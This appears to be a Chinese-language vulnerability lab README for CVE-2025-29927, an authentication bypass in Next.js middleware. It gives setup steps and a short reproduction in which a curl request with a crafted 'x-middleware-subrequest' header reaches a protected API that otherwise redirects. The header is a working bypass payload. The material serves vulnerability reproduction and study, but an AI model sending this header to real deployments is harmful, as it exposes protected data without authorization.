# Next.js 中间件授权绕过漏洞 (CVE-2025-29927) 

Next.js是一个基于React的Web应用框架。它提供了服务器端渲染、静态网站生成、路由系统和API路由等功能。当Nextjs被配置为使用中间件进行身份验证时，攻击者可以利用漏洞绕过身份验证。


## 启动环境

执行如下命令, 而后访问`http://ip:3000`即可

```
docker compose up --build
```

### 手动运行

运行如下命令

```bash
npm install
```

启动应用

```bash
npm run build
npm start
```

访问 http://ip:3000

## 复现漏洞
直接访问受保护接口：
```
curl -i  http://localhost:3000/api/protected/data
HTTP/1.1 307 Temporary Redirect
location: /unauthorized
Date: Sat, 22 Mar 2025 19:39:36 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Transfer-Encoding: chunked

/unauthorized#
```

运行如下命令即可复现。
```
curl -i -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://localhost:3000/api/protected/data
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
ETag: "8s59pt2il13l"
Content-Length: 175
Vary: Accept-Encoding
Date: Sat, 22 Mar 2025 19:41:09 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"message":"成功获取敏感数据","sensitiveData":"这是一些应该受到保护的敏感数据","userId":12345,"adminAccess":true,"timestamp":"2025-03-22T19:41:09.957Z"}#
```